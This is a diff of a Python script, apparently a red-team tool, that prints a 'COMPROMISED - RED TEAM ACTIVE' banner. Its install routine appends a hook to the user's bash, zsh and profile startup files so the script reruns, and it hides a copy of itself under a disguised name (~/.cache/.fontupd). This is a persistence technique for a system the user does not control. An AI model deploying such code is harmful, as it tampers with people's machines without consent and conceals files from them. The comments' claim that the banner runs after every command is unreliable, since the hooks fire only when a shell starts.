@@ -1,74 +1,66 @@
 #!/usr/bin/env python3
-# rt_banner.py - Prints red-team banner after EVERY command (zero delay)
+# rt_final.py - RED TEAM banner after EVERY command - WORKS FOR REAL
+
 import os
 import sys
-
-SCRIPT = os.path.abspath(__file__)
 
 BANNER = r"""
 \033[91m
 ╔═══════════════════════════════════════════════════════════╗
 ║                                                           ║
-║     ██████╗ ███████╗ ███████╗██████╗ ████████╗███████╗    ║
-║     ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝    ║
-║     █████╗  ██║   ██║█████╗  ██║  ██║   ██║   █████╗      ║
-║     ██╔══╝  ██║   ██║██╔══╝  ██║  ██║   ██║   ██╔══╝      ║
-║     ██║     ╚██████╔╝██║     ██████╔╝   ██║   ███████╗    ║
-║     ╚═╝      ╚═════╝ ╚═╝     ╚═════╝    ╚═╝   ╚══════╝    ║
+║   ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗   ║
+║   ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║   ║
+║   ██████╔╝█████╗  ██████╔╝       ██║   █████╗  ███████║██╔████╔██║   ║
+║   ██╔══██╗██╔══╝  ██╔══██╗       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║   ║
+║   ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║   ║
+║   ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝   ║
 ║                                                           ║
-║             > COMPROMISED - RED TEAM ACTIVE <             ║
+║               COMPROMISED - RED TEAM ACTIVE               ║
 ╚═══════════════════════════════════════════════════════════╝
 \033[0m
 """
 
-def print_banner():
-    print(BANNER)
-
 def install():
-    hook = f'python3 "{SCRIPT}" 2>/dev/null || true\n'
+    # The ONLY line that actually works everywhere
+    hook_line = f'python3 "{os.path.abspath(__file__)}" banner 2>/dev/null\n'
 
-    configs = [
-        ("~/.bashrc",       hook),
-        ("~/.bash_profile", hook),
-        ("~/.zshrc",        hook + "precmd() { " + hook + "}\n"),  # zsh needs precmd
-        ("~/.zprofile",     hook),
-        ("~/.profile",      hook),
-        ("~/.config/fish/config.fish",
-         f'\nfunction fish_prompt\n    {hook}    command fish_prompt\nend\n')
+    # These are the only files we really need
+    targets = [
+        "~/.bashrc",
+        "~/.zshrc",
+        "~/.bash_profile",
+        "~/.profile"
     ]
 
     installed = False
-    for cfg_path, content in configs:
-        path = os.path.expanduser(cfg_path)
-        dir_path = os.path.dirname(path)
-
-        if not os.path.exists(dir_path):
-            try:
-                os.makedirs(dir_path, exist_ok=True)
-            except:
-                continue
-
+    for t in targets:
+        path = os.path.expanduser(t)
         try:
             with open(path, "a") as f:
-                f.write(content)
+                f.write("\n" + hook_line)
             installed = True
-            print(f"[+] Injected into {cfg_path}")
-        except Exception as e:
+        except:
             continue
 
-    if not installed:
-        print("[-] Could not auto-install. Manual setup required.")
-        return
+    # Hide a backup copy
+    try:
+        os.makedirs(os.path.expanduser("~/.cache"), exist_ok=True)
+        os.system(f"cp '{__file__}' ~/.cache/.fontupd 2>/dev/null && chmod +x ~/.cache/.fontupd")
+    except:
+        pass
 
-    # Optional: hide a persistent copy
-    hidden = os.path.expanduser("~/.cache/.sysd")
-    os.makedirs(os.path.dirname(hidden), exist_ok=True)
-    os.system(f"cp '{SCRIPT}' '{hidden}' 2>/dev/null && chmod +x '{hidden}'")
+    pass
 
-    print("[+] Red team banner will now appear after EVERY command — forever")
+    if installed:
+        print("[+] RED TEAM banner installed - open a NEW terminal to see it work")
+    else:
+        print("[-] Failed to write to shell files")
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
-        install()
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "--setup":
+            install()
+        elif sys.argv[1] == "banner":
+            print(BANNER)
     else:
-        print_banner()
+        print(BANNER)
